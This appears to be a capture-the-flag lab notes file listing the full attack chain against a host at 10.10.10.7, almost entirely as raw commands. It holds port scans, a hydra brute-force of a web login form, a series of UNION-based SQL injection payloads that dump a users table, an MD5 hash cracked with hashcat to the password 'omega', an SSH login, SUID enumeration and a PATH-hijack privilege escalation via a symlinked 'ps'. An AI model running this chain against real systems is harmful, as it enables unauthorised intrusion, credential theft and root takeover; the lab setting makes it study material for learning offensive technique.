
```


sudo nmap -sn 10.10.10.10
sudo nmap --min-rate 10000 -p- 10.10.10.7 
sudo nmap -sT -sC -sV -p80,111,777,48675 10.10.10.7 -oA nmap/Scan
sudo nmap --script=vuln -p80,111,777,48675 10.10.10.7 -oA nmap/Script

sudo gobuster dir -u http://10.10.10.7 -w /usr/share/dirb/wordlists/common.txt

wget http://10.10.10.7/main.git

sudo hydra -l "key" -P /usr/share/wordlists/rockyou.txt 10.10.10.7 http-form-post "/kzMb5nVYJw/index.php:key=^PASS^:invalid key"

"

" or 1=1 -- -

" order by 3 -- -

" union select 1,2,3 -- -

" union select 1,2,version() -- -

" union select 1,2,database() -- -

" union select 1,2,user() -- -

" union select 1,2,TABLE_SCHEMA from INFORMATION_SCHEMA.tables -- -

" union select 1,2,table_name from INFORMATION_SCHEMA.tables -- -

" union select 1,2,column_name from INFORMATION_SCHEMA.columns where table_name='users' -- -

" union select 1,2,user from users -- -

" union select 1,2,pass from users -- -

" union select 1,2,position  from users -- -

hash-identifier
YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE
c6d6bd7ebf806f43c76acc3681703b81

vim hash/hash.lst

sudo hashcat -m 0 -a 0 hash/hash.lst /usr/share/wordlists/rockyou.txt
c6d6bd7ebf806f43c76acc3681703b81:omega

sudo ssh ramses@10.10.10.7 -p777 

history
cd /var/www
cd backup/
ls
cat readme.txt
ls -liah
find / -perm -u=s -type f 2>/dev/null
./procwatch

ln -s /bin/sh ps
export PATH=.:$PATH
echo $PATH

```



![[Pasted image 20250508214915.png]]


![[Pasted image 20250508230256.png]]